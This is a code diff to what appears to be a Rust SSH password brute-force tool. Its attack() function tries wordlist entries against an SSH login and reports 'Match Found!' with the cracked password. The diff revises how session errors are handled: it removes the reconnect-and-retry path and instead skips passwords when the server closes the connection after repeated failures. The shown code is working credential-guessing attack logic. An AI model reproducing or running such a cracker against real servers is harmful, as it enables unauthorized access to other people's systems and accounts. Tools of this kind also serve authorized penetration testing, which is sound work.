@@ -10,18 +10,16 @@ use crate::library;
 /// Convert the session error code into a simple enum we can match on.
 #[derive(Debug, PartialEq)]
 enum SessionError {
-    Closed,                 // Session(-7)
-    FailedAuthAndClosed,    // Session(-13)
     BadPassword,            // Session(-18)
+    ConnectionClosed,
     Other(String),          // Anything else
 }
 
 impl From<&ssh2::Error> for SessionError {
     fn from(err: &ssh2::Error) -> Self {
         match err.code().to_string().as_str() {
-            "Session(-7)" => SessionError::Closed,
-            "Session(-13)" => SessionError::FailedAuthAndClosed,
             "Session(-18)" => SessionError::BadPassword,
+            "Session(-13)" => SessionError::ConnectionClosed,
             other => SessionError::Other(other.to_owned()),
         }
     }
@@ -63,27 +61,18 @@ pub fn attack(
             }
             Err(err) => {
                 match SessionError::from(&err) {
-                    SessionError::Closed | SessionError::FailedAuthAndClosed => {
-                        if config.verbose {
-                            println!("Connection closed with \"{err}\", likely due to incorrect password limit reached.");
-                            println!("Re-establishing...");
-                        }
-                        session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error re-establishing the connection: {e}"); panic!()});
-                        match session.userauth_password(&user, line) {
-                            std::result::Result::Ok(()) => {
-                                println!("Match Found!\nPassword: {}", &line);
-                                cracked = true;
-                                break;
-                            }
-                            Err(_) => {
-                                if config.verbose {println!("Tried: {}", &line);}
-                            }
-                        }
-                    }
+                    // the password that was tried, failed
                     SessionError::BadPassword => {
-                        // go to the next password in the list
+                        println!("Bad password {err}");
                         if config.verbose {println!("Tried: {}", &line);}
                     }
+
+                    // 5 max tries before server closes connection
+                    SessionError::ConnectionClosed => {
+                        println!("Skipped {}", &line)
+                    }
+
+                    // some other error
                     SessionError::Other(err) => {
                         // other error
 
